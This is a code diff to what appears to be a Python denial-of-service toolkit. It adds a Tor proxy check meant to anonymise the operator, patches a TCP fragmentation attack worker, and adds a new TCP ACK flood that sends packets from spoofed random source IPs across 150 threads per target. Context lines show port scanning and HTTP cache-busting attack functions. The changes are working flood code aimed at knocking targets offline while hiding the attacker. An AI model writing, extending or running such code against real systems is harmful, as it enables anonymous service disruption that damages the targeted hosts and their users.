@@ -37,6 +37,37 @@ ports_lock = threading.Lock()
 
 
 # --- 1. UTILITY AND SHARED WORKER FUNCTIONS ---
+# --- NEW: TOR CONNECTION CHECKER ---
+def check_tor_connection():
+    """
+    Attempts to connect to a known onion service to verify Tor is working.
+    check.torproject.org has a special endpoint for this on port 80.
+
+    :return: True if the connection succeeds, False otherwise.
+    """
+    print("[INFO] Testing Tor connection... ", end="", flush=True)
+    is_working = False
+    s = None
+    try:
+        s = socks.socksocket()
+        s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+        s.settimeout(15)  # Give Tor some time to build a circuit
+
+        # We connect to the IP of 'check.torproject.org'
+        # Using the raw IP avoids a DNS leak.
+        s.connect(("199.254.238.130", 80))
+        is_working = True
+        print("Success!")
+    except socks.ProxyError as e:
+        print(f"Failed. Proxy Error: {e}")
+    except Exception as e:
+        print(f"Failed. General Error: {e}")
+    finally:
+        if s:
+            s.close()
+    return is_working
+
+
 # A thread-safe list to store the results of the scan
 def port_scan_worker(target_ip, port_queue):
     """Worker that takes port numbers from a queue and checks if they are open."""
@@ -566,8 +597,9 @@ def tcp_fragmentation_worker(stop_event, pause_event, target_ip, port, iface):
             # Use Scapy's fragment() function to split the packet.
             fragments = fragment(packet, fragsize=512)
 
-            # The core of the attack: send only the FIRST fragment.
-            send(fragments[0], verbose=0, iface=iface)
+            if fragments:  # Add null check
+                # The core of the attack: send only the FIRST fragment.
+                send(fragments[0], verbose=0, iface=iface)
 
         except Exception:
             pass
@@ -654,6 +686,45 @@ def attack_http_cache_bust(target_url, port, duration, stop_event, pause_event, 
                 target=http_cache_bust_worker,
                 args=(stop_event, pause_event, ip, port, target_url, use_proxy)
             )
+            t.daemon = True
+            t.start()
+
+    while time.time() < attack_end_time and not stop_event.is_set():
+        time.sleep(1)
+    stop_event.set()
+
+
+# --- NEW: TCP ACK Flood ---
+def ack_worker(stop_event, pause_event, target_ip, port, iface):
+    """
+    Worker thread that sends a continuous stream of TCP ACK packets.
+    This is designed to stress stateful firewalls.
+    """
+    while not stop_event.is_set():
+        if pause_event.is_set():
+            time.sleep(1)
+            continue
+        try:
+            # The source IP can be real or spoofed. Spoofing is harder to block.
+            spoofed_ip = generate_random_ip()
+
+            # The key is flags='A' for ACK
+            packet = IP(src=spoofed_ip, dst=target_ip) / TCP(dport=port, sport=RandShort(), flags='A')
+
+            send(packet, verbose=0, iface=iface)
+        except Exception:
+            pass
+
+
+def attack_ack_flood(target_url, port, duration, stop_event, pause_event, threads=150, iface=None):
+    """Controller for TCP ACK flood attacks."""
+    ips = resolve_to_ipv4(target_url)
+    if not ips: return
+
+    attack_end_time = time.time() + duration
+    for ip in ips:
+        for _ in range(threads):
+            t = threading.Thread(target=ack_worker, args=(stop_event, pause_event, ip, port, iface))
             t.daemon = True
             t.start()
 
